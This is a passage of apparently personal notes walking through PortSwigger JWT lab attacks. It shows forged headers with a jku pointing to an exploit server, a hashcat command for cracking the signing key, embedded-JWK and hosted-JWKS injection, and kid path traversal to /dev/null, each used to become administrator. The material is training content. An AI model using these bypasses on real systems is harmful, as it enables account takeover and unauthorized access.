WITH ALL OF THESE: 
ensure that the JSON is correctly formatted, with , after every but last argument.

like so
header:
{
    "kid": "3fd54976-6650-417a-8675-6b9aa5679e17",
    "alg": "RS256",
    "jku": "https://exploit-0afb00e2044a782b80a1435e010d002b.exploit-server.net/exploit.jwk"
}

payload
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1706177679
}


3. JWT authentication bypass via weak signing key
ATTENTION: Weak key is easily detected by Burp Suite Passive Scanner

Crack signing key with hashcat: hashcat -m 16500 -a 0 <full_jwt> /usr/share/wordlists/rockyou.txt

4. JWT authentication bypass via jwk header injection
4.1 Go to JWT Editor Keys - New RSA Key - Generate
4.2 Get Request with JWT token - Repeater - JSON Web Token tab - Attack (at the bottom) - Embedded JWK - Select your previously generated key - OK

5. JWT authentication bypass via jku header injection
5.1 JWT Editor Keys - New RSA Key - Generate - right-click on key - Copy Public Key as JWK
5.2 Go to your exploit server and paste the next payload in Body:

{
    "keys": [

    ]
}
5.3 In "keys" section paste your previously copied JWK:

{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
        }
    ]
}
5.4 Back to our JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.
5.5 Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
5.6 Change "sub" to administrator
5.7 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key

6. JWT authentication bypass via kid header path traversal
6.1 JWT Editor Keys - New Symmetric Key - Generate - replace the value of "k" parameter to AA== - OK
6.2 Back to our JWT, replace "kid" parameter with ../../../../../dev/null
6.3 Change "sub" to administrator
6.4 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key
